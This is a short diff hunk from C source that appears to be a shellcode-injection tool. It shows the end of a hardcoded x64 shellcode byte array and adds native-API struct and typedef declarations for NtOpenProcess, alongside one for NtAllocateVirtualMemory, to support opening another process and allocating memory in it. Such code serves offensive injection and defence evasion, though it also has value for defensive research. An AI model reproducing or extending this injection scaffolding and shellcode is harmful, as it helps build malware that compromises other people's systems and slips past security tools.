@@ -34,8 +34,31 @@ char shellcode_x64[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00
 "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
 "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
+//------------------STRUCT------------------------------
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG              Length;
+    HANDLE             RootDirectory;
+    PUNICODE_STRING    ObjectName;
+    ULONG              Attributes;
+    PVOID              SecurityDescriptor;
+    PVOID              SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+typedef struct _CLIENT_ID {
+    PVOID              UniqueProcess;
+    PVOID              UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
 
 //------------------FUNCTIONS---------------------------
+
+typedef NTSYSCALLAPI NTSTATUS NTOPENPROCESS(
+    PHANDLE            ProcessHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PCLIENT_ID         ClientId
+); typedef NTOPENPROCESS *LPNTOPENPROCESS;
 
 typedef NTSYSCALLAPI NTSTATUS NTALLOCATEVIRTUALMEMORY(
     HANDLE    ProcessHandle,
